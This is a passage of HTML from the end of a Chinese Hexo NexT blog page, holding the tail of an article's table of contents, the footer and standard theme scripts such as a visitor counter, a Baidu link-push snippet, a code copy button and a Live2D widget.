class="nav-number">4.4.</span> <span class="nav-text">第4点</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#第5点"><span class="nav-number">4.5.</span> <span class="nav-text">第5点</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#补充"><span class="nav-number">4.6.</span> <span class="nav-text">补充</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x04写在最后"><span class="nav-number">5.</span> <span class="nav-text">0x04写在最后</span></a></li></ol></div></div></div><div class="back-to-top"><i class="fa fa-arrow-up"></i> <span id="scrollpercent"><span>0</span>%</span></div></div></aside></div></main><footer id="footer" class="footer"><div class="footer-inner"><script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div class="copyright">&copy; 2019 – <span itemprop="copyrightYear">2022</span> <span class="with-love" id="animate"><i class="fa fa-star"></i> </span><span class="author" itemprop="copyrightHolder">LiuLian</span></div><div class="powered-by"><i class="fa fa-user-md"></i><span id="busuanzi_container_site_uv"> 本站访客数:<span id="busuanzi_value_site_pv"></span></span></div><div class="busuanzi-count"><script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span class="post-meta-item-icon"><i class="fa fa-user"></i> </span><span class="site-uv" title="总访客量"><span class="busuanzi-value" id="busuanzi_value_site_uv"></span> </span><span class="post-meta-divider">|</span> <span class="post-meta-item-icon"><i class="fa fa-s"></i> </span><span class="site-pv" title="总访问量"><span class="busuanzi-value" id="busuanzi_value_site_pv"></span></span></div></div></footer></div><script>"[object Function]"!==Object.prototype.toString.call(window.Promise)&&(window.Promise=null)</script><script color="255,105,180" opacity="0.6" zindex="-1" count="77" src="/lib/canvas-nest/canvas-nest.min.js"></script><script src="/lib/jquery/index.js?v=2.1.3"></script><script src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script><script src="/lib/velocity/velocity.min.js?v=1.2.1"></script><script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script><script src="/js/utils.js?v=7.1.0"></script><script src="/js/motion.js?v=7.1.0"></script><script src="/js/affix.js?v=7.1.0"></script><script src="/js/schemes/pisces.js?v=7.1.0"></script><script src="/js/scrollspy.js?v=7.1.0"></script><script src="/js/post-details.js?v=7.1.0"></script><script src="/js/next-boot.js?v=7.1.0"></script><script>!function(){var t=document.createElement("script"),e=window.location.protocol.split(":")[0];t.src="https"===e?"https://zz.bdstatic.com/linksubmit/push.js":"http://push.zhanzhang.baidu.com/push.js";var s=document.getElementsByTagName("script")[0];s.parentNode.insertBefore(t,s)}()</script><script>$(".highlight").each(function(e,t){var n=$("<div>").addClass("highlight-wrap");$(t).after(n),n.append($("<button>").addClass("copy-btn").append("复制").on("click",function(e){var t=$(this).parent().find(".code").find(".line").map(function(e,t){return $(t).text()}).toArray().join("\n"),n=document.createElement("textarea"),o=window.pageYOffset||document.documentElement.scrollTop;n.style.top=o+"px",n.style.position="absolute",n.style.opacity="0",n.readOnly=!0,n.value=t,document.body.appendChild(n),n.select(),n.setSelectionRange(0,t.length),n.readOnly=!1;document.execCommand("copy");n.blur(),$(this).blur()})).on("mouseleave",function(e){var t=$(this).find(".copy-btn");setTimeout(function(){t.text("复制")},300)}).append(t)})</script><script type="text/javascript" color="0,191,255" opacity="1" zindex="-2" count="60" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script><script type="text/javascript" src="/js/src/clicklove.js"></script><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({pluginRootPath:"live2dw/",pluginJsPath:"lib/",pluginModelPath:"assets/",tagMode:!1,debug:!1,model:{jsonPath:"/live2dw/assets/z16.model.json"},display:{position:"right",width:210,height:420},mobile:{show:!0},log:!1})</script></body></html>